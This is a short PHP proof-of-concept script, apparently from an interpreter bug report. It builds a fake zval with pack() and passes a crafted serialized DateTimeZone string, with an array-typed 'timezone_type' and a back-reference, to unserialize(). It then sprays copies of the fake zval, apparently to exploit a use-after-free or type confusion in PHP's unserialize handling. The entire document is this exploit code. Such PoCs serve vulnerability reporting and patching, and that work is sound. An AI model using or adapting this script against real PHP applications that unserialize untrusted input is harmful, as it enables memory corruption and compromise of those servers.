<?php

$fakezval = pack(
    'IIII',
    0x00100000,
    0x00000400,
    0x00000000,
    0x00000006 
);

$data = unserialize('a:2:{i:0;O:12:"DateTimeZone":2:{s:13:"timezone_type";a:2:{i:0;i:1;i:1;i:2;}s:8:"timezone";s:1:"A";}i:1;R:4;}');

for($i = 0; $i < 5; $i++) {
    $v[$i] = $fakezval.$i;
}

var_dump($data);
?>
